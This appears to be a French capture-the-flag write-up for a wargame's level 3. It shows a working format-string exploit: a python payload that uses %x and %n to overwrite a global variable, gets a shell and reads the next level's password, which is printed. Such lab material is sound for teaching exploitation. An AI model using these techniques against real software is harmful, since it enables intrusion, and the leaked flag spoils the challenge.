```
▄▄▄     ▄▄▄▄▄▄▄ ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄        ▄▄▄▄▄▄▄ 
█   █   █       █  █ █  █       █   █      █       █
█   █   █    ▄▄▄█  █▄█  █    ▄▄▄█   █      █▄▄▄    █
█   █   █   █▄▄▄█       █   █▄▄▄█   █       ▄▄▄█   █
█   █▄▄▄█    ▄▄▄█       █    ▄▄▄█   █▄▄▄   █▄▄▄    █
█       █   █▄▄▄ █     ██   █▄▄▄█       █   ▄▄▄█   █
█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█  █▄▄▄▄▄▄▄█
```

- [Tuto](https://nikhilh20.medium.com/format-string-exploit-ccefad8fd66b)
- Ici la vulnerabilité est que le format de printf peut etre modifier avec gets
```
$> ./level3
%d
512
```
- On regarde ensuite qu'elle est l'addresse de la fonction m. Que l'on veux overwrite.

<pre>
$> nm level3
<strong>0804988c</strong> B m
</pre>

- On regarde à combien de %x il faut pour trouver l'adresse print.

<pre>
$> (python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*5)") | ./level3
AAAA200 b7fd1ac0 b7ff37d0 <strong>41414141 804988c</strong>
</pre>
- Il suffit d'utiliser `%n` qui permet d'ecrire le nombre de caractere d'avant dans la variable (ici 0x0804988c) 
```
(python -c "print ('AAAA' + '\x8c\x98\x04\x08' + '%x '*4 + 'A'*25 + '%n')"; cat) | ./level3
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
